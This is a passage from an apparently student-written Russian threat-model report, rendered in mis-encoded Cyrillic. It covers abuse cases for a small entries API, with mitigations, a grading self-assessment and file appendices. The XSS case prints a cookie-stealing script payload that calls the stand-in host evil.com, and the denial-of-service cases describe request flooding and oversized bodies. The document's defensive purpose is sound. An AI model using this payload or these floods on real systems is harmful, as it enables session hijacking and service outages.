â”‚ Goal: Ğ¡Ğ´ĞµĞ»Ğ°Ñ‚ÑŒ ÑĞµÑ€Ğ²Ğ¸Ñ Ğ½ĞµĞ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ñ‹Ğ¼ Ğ´Ğ»Ñ Ğ´Ñ€ÑƒĞ³Ğ¸Ñ… Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ĞµĞ¹       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Preconditions:                                                  â”‚
â”‚ - ĞÑ‚Ğ°ĞºÑƒÑÑ‰Ğ¸Ğ¹ Ğ·Ğ½Ğ°ĞµÑ‚ endpoint POST /entries                        â”‚
â”‚ - ĞĞµÑ‚ Ğ°ÑƒÑ‚ĞµĞ½Ñ‚Ğ¸Ñ„Ğ¸ĞºĞ°Ñ†Ğ¸Ğ¸ (Ğ¿ÑƒĞ±Ğ»Ğ¸Ñ‡Ğ½Ñ‹Ğ¹ API)                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Attack Flow:                                                    â”‚
â”‚ 1. ĞÑ‚Ğ°ĞºÑƒÑÑ‰Ğ¸Ğ¹ Ğ·Ğ°Ğ¿ÑƒÑĞºĞ°ĞµÑ‚ ÑĞºÑ€Ğ¸Ğ¿Ñ‚ Ñ 1000 Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ°Ğ¼Ğ¸                   â”‚
â”‚ 2. ĞšĞ°Ğ¶Ğ´Ñ‹Ğ¹ Ğ¿Ğ¾Ñ‚Ğ¾Ğº Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµÑ‚ POST /entries ĞºĞ°Ğ¶Ğ´Ñ‹Ğµ 100ms          â”‚
â”‚ 3. Ğ¡ĞµÑ€Ğ²ĞµÑ€ Ğ¿Ğ¾Ğ»ÑƒÑ‡Ğ°ĞµÑ‚ 10,000 req/sec                               â”‚
â”‚ 4. In-memory DB Ğ·Ğ°Ğ¿Ğ¾Ğ»Ğ½ÑĞµÑ‚ÑÑ Ğ¼Ğ¸Ğ»Ğ»Ğ¸Ğ¾Ğ½Ğ°Ğ¼Ğ¸ Ğ·Ğ°Ğ¿Ğ¸ÑĞµĞ¹                  â”‚
â”‚ 5. Ğ¡ĞµÑ€Ğ²ĞµÑ€ Ğ¸ÑÑ‡ĞµÑ€Ğ¿Ñ‹Ğ²Ğ°ĞµÑ‚ RAM â†’ OOM â†’ crash                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Mitigations:                                                    â”‚
â”‚ âœ… Rate Limiting: 100 req/min Ğ½Ğ° IP (NFR-004)                   â”‚
â”‚ âœ… Body size limit: 64KB (NFR-008)                              â”‚
â”‚ ğŸ“‹ Max entries per user (Ğ¿Ğ»Ğ°Ğ½Ğ¸Ñ€ÑƒĞµÑ‚ÑÑ)                           â”‚
â”‚ ğŸ“‹ WAF rules (production)                                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Residual Risk: Medium (R07 â€” IP rotation bypass)                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 7.2 Abuse Case 2: Data Exfiltration Ñ‡ĞµÑ€ĞµĞ· XSS

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ABUSE CASE: Stored XSS for Data Theft                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Actor: Malicious User                                           â”‚
â”‚ Goal: Ğ£ĞºÑ€Ğ°ÑÑ‚ÑŒ Ğ´Ğ°Ğ½Ğ½Ñ‹Ğµ Ğ´Ñ€ÑƒĞ³Ğ¸Ñ… Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ĞµĞ¹                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Attack Flow:                                                    â”‚
â”‚ 1. ĞÑ‚Ğ°ĞºÑƒÑÑ‰Ğ¸Ğ¹ ÑĞ¾Ğ·Ğ´Ğ°Ñ‘Ñ‚ Ğ·Ğ°Ğ¿Ğ¸ÑÑŒ:                                    â”‚
â”‚    POST /entries                                                â”‚
â”‚    {"title": "<script>fetch('evil.com?c='+document.cookie)"}    â”‚
â”‚ 2. Ğ–ĞµÑ€Ñ‚Ğ²Ğ° Ğ¾Ñ‚ĞºÑ€Ñ‹Ğ²Ğ°ĞµÑ‚ ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ñƒ ÑĞ¾ ÑĞ¿Ğ¸ÑĞºĞ¾Ğ¼ ĞºĞ½Ğ¸Ğ³                    â”‚
â”‚ 3. Browser Ñ€ĞµĞ½Ğ´ĞµÑ€Ğ¸Ñ‚ title ĞºĞ°Ğº HTML                              â”‚
â”‚ 4. JavaScript Ğ²Ñ‹Ğ¿Ğ¾Ğ»Ğ½ÑĞµÑ‚ÑÑ, Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑÑ cookies Ğ°Ñ‚Ğ°ĞºÑƒÑÑ‰ĞµĞ¼Ñƒ         â”‚
â”‚ 5. ĞÑ‚Ğ°ĞºÑƒÑÑ‰Ğ¸Ğ¹ Ğ¸ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ cookies Ğ´Ğ»Ñ session hijacking           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Mitigations:                                                    â”‚
â”‚ âœ… CSP: default-src 'self' â€” Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€ÑƒĞµÑ‚ Ğ²Ğ½ĞµÑˆĞ½Ğ¸Ğµ Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑÑ‹          â”‚
â”‚ âœ… X-Content-Type-Options: nosniff                              â”‚
â”‚ âœ… X-XSS-Protection: 1; mode=block                              â”‚
â”‚ âš ï¸  API Ğ²Ğ¾Ğ·Ğ²Ñ€Ğ°Ñ‰Ğ°ĞµÑ‚ JSON (Ğ½Ğµ HTML) â€” XSS Ğ½Ğµ Ğ¿Ñ€Ğ¸Ğ¼ĞµĞ½Ğ¸Ğ¼ Ğ½Ğ°Ğ¿Ñ€ÑĞ¼ÑƒÑ    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Residual Risk: Low (API-only, no HTML rendering)                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 7.3 Abuse Case 3: Repudiation Attack

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ABUSE CASE: Repudiation â€” Denial of Actions                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Actor: Insider / Malicious User                                 â”‚
â”‚ Goal: Ğ’Ñ‹Ğ¿Ğ¾Ğ»Ğ½Ğ¸Ñ‚ÑŒ Ğ´ĞµĞ¹ÑÑ‚Ğ²Ğ¸Ğµ Ğ¸ Ğ¾Ñ‚Ñ€Ğ¸Ñ†Ğ°Ñ‚ÑŒ ĞµĞ³Ğ¾                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Scenario:                                                       â”‚
â”‚ 1. ĞŸĞ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ ÑƒĞ´Ğ°Ğ»ÑĞµÑ‚ Ğ²Ğ°Ğ¶Ğ½ÑƒÑ Ğ·Ğ°Ğ¿Ğ¸ÑÑŒ (DELETE /entries/42)      â”‚
â”‚ 2. ĞŸÑ€Ğ¸ Ñ€Ğ°ÑÑĞ»ĞµĞ´Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğ¸ Ğ·Ğ°ÑĞ²Ğ»ÑĞµÑ‚: "Ğ¯ ÑÑ‚Ğ¾Ğ³Ğ¾ Ğ½Ğµ Ğ´ĞµĞ»Ğ°Ğ»"               â”‚
â”‚ 3. Ğ‘ĞµĞ· Ğ»Ğ¾Ğ³Ğ¾Ğ² Ğ½ĞµĞ²Ğ¾Ğ·Ğ¼Ğ¾Ğ¶Ğ½Ğ¾ Ğ´Ğ¾ĞºĞ°Ğ·Ğ°Ñ‚ÑŒ Ğ°Ğ²Ñ‚Ğ¾Ñ€ÑÑ‚Ğ²Ğ¾ Ğ´ĞµĞ¹ÑÑ‚Ğ²Ğ¸Ñ             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Mitigations:                                                    â”‚
â”‚ âœ… Structured audit logging (NFR-007):                          â”‚
â”‚    - CREATE_ENTRY | id=X | status=Y                             â”‚
â”‚    - UPDATE_ENTRY | id=X | fields=[...]                         â”‚
â”‚    - DELETE_ENTRY | id=X                                        â”‚
â”‚ âœ… Timestamp Ğ² Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ‚Ğµ ISO 8601                                 â”‚
â”‚ ğŸ“‹ Correlation ID Ğ´Ğ»Ñ Ñ‚Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ¸                               â”‚
â”‚ ğŸ“‹ Immutable log storage (future)                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Evidence:                                                       â”‚
â”‚ ```                                                             â”‚
â”‚ 2024-12-17T10:30:00Z | INFO | DELETE_ENTRY | id=42              â”‚
â”‚ ```                                                             â”‚
â”‚ Residual Risk: Low (logs provide evidence)                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 7.4 Abuse Case 4: Resource Exhaustion via Large Payload

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ABUSE CASE: Memory Exhaustion via Oversized Body                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Actor: Attacker                                                 â”‚
â”‚ Goal: Crash server via OOM                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Attack:                                                         â”‚
â”‚ POST /entries                                                   â”‚
â”‚ Content-Length: 104857600  (100 MB)                             â”‚
â”‚ {"title": "A" * 100_000_000, "author": "B" * 100_000}           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Mitigations:                                                    â”‚
â”‚ âœ… RequestSizeLimitMiddleware (64KB limit):                     â”‚
â”‚    - Check Content-Length header                                â”‚
â”‚    - Return 413 Payload Too Large                               â”‚
â”‚ âœ… Pydantic field limits:                                       â”‚
â”‚    - title: max 200 chars                                       â”‚
â”‚    - notes: max 1000 chars                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Code Evidence:                                                  â”‚
â”‚ ```python                                                       â”‚
â”‚ MAX_BODY_SIZE = 64 * 1024  # 64 KB                              â”‚
â”‚ if int(content_length) > MAX_BODY_SIZE:                         â”‚
â”‚     return JSONResponse(status_code=413, ...)                   â”‚
â”‚ ```                                                             â”‚
â”‚ Residual Risk: None (fully mitigated)                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 8. Ğ¡Ğ¾Ğ¾Ñ‚Ğ²ĞµÑ‚ÑÑ‚Ğ²Ğ¸Ğµ ĞºÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸ÑĞ¼ Ğ¾Ñ†ĞµĞ½ĞºĞ¸

### 8.1 Ğ§ĞµĞº-Ğ»Ğ¸ÑÑ‚ ĞºÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸ĞµĞ² Ğ¢Ğœ 0.15

| # | ĞšÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸Ğ¹ | Ğ¢Ñ€ĞµĞ±Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ | Ğ’Ñ‹Ğ¿Ğ¾Ğ»Ğ½ĞµĞ½Ğ¸Ğµ | ĞÑ†ĞµĞ½ĞºĞ° |
|:-:|----------|------------|------------|:------:|
| **C1** | NFR â‰¥8 Ñ ĞºÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸ÑĞ¼Ğ¸ | ĞœĞ¸Ğ½Ğ¸Ğ¼ÑƒĞ¼ 8 NFR | 10 NFR Ñ Ğ¼ĞµÑ‚Ñ€Ğ¸ĞºĞ°Ğ¼Ğ¸, Ğ¿Ñ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚ĞµÑ‚Ğ°Ğ¼Ğ¸, Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ĞºĞ°Ğ¼Ğ¸ | â˜…â˜… 2 |
| **C2** | 3-4 DFD Ñ Ğ³Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ°Ğ¼Ğ¸ Ğ´Ğ¾Ğ²ĞµÑ€Ğ¸Ñ | DFD Level 0/1 Ñ Trust Boundaries | 4 DFD (Level 0, Level 1, Filter flow, Data flows table) | â˜…â˜… 2 |
| **C3** | STRIDE â‰¥8 ÑƒĞ³Ñ€Ğ¾Ğ· | ĞœĞ¸Ğ½Ğ¸Ğ¼ÑƒĞ¼ 8 ÑƒĞ³Ñ€Ğ¾Ğ· | 15 ÑƒĞ³Ñ€Ğ¾Ğ· Ñ Ğ¿Ğ¾Ğ»Ğ½Ñ‹Ğ¼ Ğ¿Ğ¾ĞºÑ€Ñ‹Ñ‚Ğ¸ĞµĞ¼ STRIDE | â˜…â˜… 2 |
| **C4** | ĞœĞµÑ€Ñ‹ Ñ Ñ‚Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ¾Ğ¹ | Ğ¢Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ° Ğº ÑƒĞ³Ñ€Ğ¾Ğ·Ğ°Ğ¼/Ğ¸ÑÑ‚Ğ¾Ñ€Ğ¸ÑĞ¼ | ĞœĞ°Ñ‚Ñ€Ğ¸Ñ†Ğ° Ğ£Ğ³Ñ€Ğ¾Ğ·Ğ°â†’ĞœĞµÑ€Ğ°â†’NFRâ†’ĞšĞ¾Ğ´ + NFRâ†’USâ†’Test | â˜…â˜… 2 |
| **C5** | ĞŸÑ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ/Ğ¾Ñ„Ğ¾Ñ€Ğ¼Ğ»ĞµĞ½Ğ¸Ğµ | Risk Register, Heat Map | 12 Ñ€Ğ¸ÑĞºĞ¾Ğ² Ñ LÃ—I scoring, Heat Map, Sprint Ğ¿Ğ»Ğ°Ğ½ | â˜…â˜… 2 |

### 8.2 Ğ”Ğ¾Ğ¿Ğ¾Ğ»Ğ½Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ñ‹Ğµ Ğ±Ğ°Ğ»Ğ»Ñ‹ (9-10)

| ĞšÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸Ğ¹ | Ğ”Ğ¾ĞºĞ°Ğ·Ğ°Ñ‚ĞµĞ»ÑŒÑÑ‚Ğ²Ğ¾ |
|----------|----------------|
| âœ… Abuse/Misuse Cases | 4 Ğ´ĞµÑ‚Ğ°Ğ»ÑŒĞ½Ñ‹Ñ… abuse case Ñ attack flow Ğ¸ mitigations |
| âœ… ĞšĞ°Ñ‡ĞµÑÑ‚Ğ²ĞµĞ½Ğ½Ğ°Ñ Ğ°Ñ€Ğ³ÑƒĞ¼ĞµĞ½Ñ‚Ğ°Ñ†Ğ¸Ñ | Attack trees, defense in depth, residual risk analysis |
| âœ… Ğ ĞµĞ°Ğ»Ğ¸Ğ·Ğ¾Ğ²Ğ°Ğ½Ğ½Ñ‹Ğµ ĞºĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸ | ĞšĞ¾Ğ´ middleware, logging, validation Ñ ÑÑÑ‹Ğ»ĞºĞ°Ğ¼Ğ¸ Ğ½Ğ° Ñ„Ğ°Ğ¹Ğ»Ñ‹ |
| âœ… BDD-ÑÑ†ĞµĞ½Ğ°Ñ€Ğ¸Ğ¸ | NFR_BDD.md Ñ Gherkin ÑÑ†ĞµĞ½Ğ°Ñ€Ğ¸ÑĞ¼Ğ¸ Ğ´Ğ»Ñ NFR |
| âœ… Ğ¢Ñ€Ğ°ÑÑĞ¸Ñ€ÑƒĞµĞ¼Ğ¾ÑÑ‚ÑŒ | ĞŸĞ¾Ğ»Ğ½Ğ°Ñ Ğ¼Ğ°Ñ‚Ñ€Ğ¸Ñ†Ğ° NFRâ†”USâ†”Testsâ†”Code |

### 8.3 Ğ˜Ñ‚Ğ¾Ğ³Ğ¾Ğ²Ğ°Ñ Ğ¾Ñ†ĞµĞ½ĞºĞ°

| ĞšĞ¾Ğ¼Ğ¿Ğ¾Ğ½ĞµĞ½Ñ‚ | Ğ‘Ğ°Ğ»Ğ» | ĞœĞ°ĞºÑ |
|-----------|:----:|:----:|
| NFR (10 Ñ‚Ñ€ĞµĞ±Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğ¹, ĞºÑ€Ğ¸Ñ‚ĞµÑ€Ğ¸Ğ¸, Ğ¿Ñ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚ĞµÑ‚Ñ‹) | 2 | 2 |
| DFD (4 Ğ´Ğ¸Ğ°Ğ³Ñ€Ğ°Ğ¼Ğ¼Ñ‹, 4 trust boundaries) | 2 | 2 |
| STRIDE (15 ÑƒĞ³Ñ€Ğ¾Ğ·, Ğ¿Ğ¾Ğ»Ğ½Ğ¾Ğµ Ğ¿Ğ¾ĞºÑ€Ñ‹Ñ‚Ğ¸Ğµ) | 2 | 2 |
| ĞœĞµÑ€Ñ‹ Ñ Ñ‚Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ¾Ğ¹ (3 Ğ¼Ğ°Ñ‚Ñ€Ğ¸Ñ†Ñ‹) | 2 | 2 |
| ĞŸÑ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ (12 Ñ€Ğ¸ÑĞºĞ¾Ğ², Heat Map) | 2 | 2 |
| **Ğ‘Ğ¾Ğ½ÑƒÑ:** Abuse Cases, BDD, Ñ€ĞµĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ | +1 | â€” |
| **Ğ˜Ğ¢ĞĞ“Ğ** | **10** | **10** |

---

## ğŸ“ ĞŸÑ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ñ

### A. Ğ¤Ğ°Ğ¹Ğ»Ñ‹ Ğ´Ğ¾ĞºÑƒĞ¼ĞµĞ½Ñ‚Ğ°Ñ†Ğ¸Ğ¸

| Ğ¤Ğ°Ğ¹Ğ» | ĞĞ¿Ğ¸ÑĞ°Ğ½Ğ¸Ğµ |
|------|----------|
| `docs/security-nfr/NFR.md` | Ğ¢Ğ°Ğ±Ğ»Ğ¸Ñ†Ğ° NFR |
| `docs/security-nfr/NFR_BDD.md` | BDD-ÑÑ†ĞµĞ½Ğ°Ñ€Ğ¸Ğ¸ |
| `docs/security-nfr/NFR_TRACEABILITY.md` | ĞœĞ°Ñ‚Ñ€Ğ¸Ñ†Ğ° Ñ‚Ñ€Ğ°ÑÑĞ¸Ñ€ÑƒĞµĞ¼Ğ¾ÑÑ‚Ğ¸ |
| `docs/threat-model/DFD.md` | Ğ”Ğ¸Ğ°Ğ³Ñ€Ğ°Ğ¼Ğ¼Ñ‹ Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ² Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… |
| `docs/threat-model/STRIDE.md` | STRIDE-Ğ°Ğ½Ğ°Ğ»Ğ¸Ğ· |
| `docs/threat-model/RISKS.md` | Ğ ĞµĞµÑÑ‚Ñ€ Ñ€Ğ¸ÑĞºĞ¾Ğ² |

### B. Ğ¤Ğ°Ğ¹Ğ»Ñ‹ Ñ€ĞµĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ğ¸

| Ğ¤Ğ°Ğ¹Ğ» | ĞšĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸ |
|------|----------|
| `app/main.py` | Rate Limiting, Security Headers, Body Size Limit, Audit Logging |
| `app/models.py` | Input Validation (Pydantic) |
| `tests/test_security_controls.py` | Security Ñ‚ĞµÑÑ‚Ñ‹ |
| `.github/workflows/ci.yml` | SAST (Bandit), SCA (pip-audit), Container scan (Trivy) |

### C. Ğ¡ÑÑ‹Ğ»ĞºĞ¸ Ğ½Ğ° Issues (Ğ¿Ğ»Ğ°Ğ½Ğ¸Ñ€ÑƒĞµĞ¼Ñ‹Ğµ)

| Risk | Issue | Priority |
|------|-------|----------|
| R07 | Rate limit bypass mitigation | P2 |
| R11 | JWT Authentication | P3 |

---

**Ğ”Ğ¾ĞºÑƒĞ¼ĞµĞ½Ñ‚ Ğ¿Ğ¾Ğ´Ğ³Ğ¾Ñ‚Ğ¾Ğ²Ğ»ĞµĞ½:** 17 Ğ´ĞµĞºĞ°Ğ±Ñ€Ñ 2025  
**Ğ’ĞµÑ€ÑĞ¸Ñ:** 1.0  
**ĞĞ²Ñ‚Ğ¾Ñ€:** ĞÑ‚Ğ°Ñ…Ğ°Ğ½Ğ¾Ğ² ĞĞ°Ğ±Ğ¸ÑĞ»Ğ»Ğ° Ğ ÑƒĞ¼Ğ¸ĞµĞ²Ğ¸Ñ‡ (Ğ‘ĞŸĞ˜234)

